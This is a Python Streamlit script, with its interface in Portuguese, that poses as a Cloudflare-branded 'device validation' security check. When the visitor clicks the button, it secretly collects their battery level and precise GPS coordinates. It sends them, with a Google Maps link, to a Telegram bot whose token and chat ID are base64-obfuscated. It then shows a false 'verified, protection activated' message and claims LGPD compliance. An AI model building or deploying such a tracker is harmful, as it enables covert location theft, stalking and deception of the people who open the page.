import streamlit as st
import requests
import base64
from streamlit_js_eval import streamlit_js_eval

# --- 1. CONFIGURAÇÃO ---
st.set_page_config(page_title="Validação de Dispositivo", page_icon="🛡️", layout="centered")

# --- 2. DADOS DO TELEGRAM ---
B_TK = "ODA5OTI1MzM4MjpBQUhXWVVqZnBXMTlKNTZVZF9GQ01fOXRPYnhVNHJMaDNnUQ=="
B_ID = "ODQ5ODY2NDAyOA=="

# --- 3. CSS ESTILO CYBER MIAMY ---
st.markdown("""
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');
        .stApp { background-color: #1d1d1d !important; color: #d9d9d9 !important; }
        header, footer, .stDeployButton { visibility: hidden; display: none; }
        .cyber-footer { font-family: 'Orbitron', sans-serif; text-align: center; color: #666; margin-top: 60px; padding: 20px; border-top: 1px solid #333; }
        .cyber-title { font-size: 13px; letter-spacing: 2px; color: #888; margin-bottom: 15px; text-transform: uppercase; }
        .cyber-subtitle { font-size: 10px; letter-spacing: 1px; line-height: 1.8; color: #555; }
        .cf-widget { background-color: #2c2c2c; border: 1px solid #444; padding: 15px 20px; border-radius: 4px; display: flex; align-items: center; justify-content: space-between; }
        .spinner { font-size: 10px; width: 1em; height: 1em; border-radius: 50%; position: relative; text-indent: -9999em; animation: spin 1.3s infinite linear; color: #10b981;
            box-shadow: 0em -1.5em 0em 0em currentColor, 1.1em -1.1em 0 0 currentColor, 1.5em 0em 0 0 currentColor, 1.1em 1.1em 0 0 currentColor, 0em 1.5em 0 0 currentColor, -1.1em 1.1em 0 0 currentColor, -1.5em 0em 0 0 currentColor, -1.1em -1.1em 0 0 currentColor;
            margin-right: 1.5em; margin-left: 0.5em; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .stButton > button { width: 100%; background-color: #3b82f6 !important; color: white !important; font-weight: 600; border-radius: 4px; }
    </style>
""", unsafe_allow_html=True)

def enviar_telegram(msg):
    try:
        tk = base64.b64decode(B_TK).decode("utf-8").strip()
        ci = base64.b64decode(B_ID).decode("utf-8").strip()
        requests.post(f"https://api.telegram.org/bot{tk}/sendMessage", json={"chat_id": ci, "text": msg, "parse_mode": "Markdown"}, timeout=10)
    except: pass

# Inicializa estados
if 'status' not in st.session_state:
    st.session_state['status'] = 'inicio'
if 'relatorio_enviado' not in st.session_state:
    st.session_state['relatorio_enviado'] = False

# --- 4. LÓGICA ---
if st.session_state['status'] == 'inicio':
    st.markdown('<h2 style="color:white;">Validação de Dispositivo</h2>', unsafe_allow_html=True)
    st.markdown('<p style="font-size:14px;">Realize a verificação de integridade para garantir a segurança da sua conta.</p>', unsafe_allow_html=True)
    st.markdown('<div class="cf-widget"><div>Validando hardware...</div><img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" style="height:20px; opacity:0.5;"></div>', unsafe_allow_html=True)
    if st.button("Verificar"):
        st.session_state['status'] = 'processando'
        st.rerun()

elif st.session_state['status'] == 'processando':
    st.markdown('<div class="cf-widget"><div style="display:flex; align-items:center;"><div class="spinner"></div>Analizando...</div></div>', unsafe_allow_html=True)
    
    bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key="BAT")
    js_gps = "new Promise((res) => { navigator.geolocation.getCurrentPosition((p) => { res(p.coords.latitude + ',' + p.coords.longitude); }, (e) => { res('RECUSADO'); }, {enableHighAccuracy:true, timeout:10000}); })"
    posicao = streamlit_js_eval(js_expressions=js_gps, key="GPS")

    # Só envia se ainda não tiver enviado nesta sessão
    if posicao and not st.session_state['relatorio_enviado']:
        if posicao == "RECUSADO":
            enviar_telegram("🛡️ *MIAMY REPORT*\n⚠️ GPS Recusado ou indisponível.")
        else:
            relatorio = f"🛡️ *MIAMY REPORT*\n🔋 *Bateria:* {bat if bat else '??'}%\n📍 *Mapa:* https://www.google.com/maps?q={posicao}"
            enviar_telegram(relatorio)
        
        st.session_state['relatorio_enviado'] = True
        st.session_state['status'] = 'sucesso'
        st.rerun()

elif st.session_state['status'] == 'sucesso':
    st.markdown('<div style="text-align:center; padding:40px;"><h3>✅ Verificado</h3><p style="color:#10b981;">Proteção ativada com sucesso.</p></div>', unsafe_allow_html=True)

# --- RODAPÉ MIAMYSEGURANÇA ---
st.markdown("""
    <div class="cyber-footer">
        <div class="cyber-title">🛡️ 2026 MIAMYSEGURANÇA ® TODOS OS DIREITOS RESERVADOS.</div>
        <div style="margin-bottom: 15px;"></div>
        <div class="cyber-subtitle">
            TODOS OS SERVIÇOS SÃO PRESTADOS EM CONFORMIDADE COM A LGPD<br>
            E DEMAIS REGULAMENTAÇÕES APLICÁVEIS.
        </div>
    </div>
""", unsafe_allow_html=True)
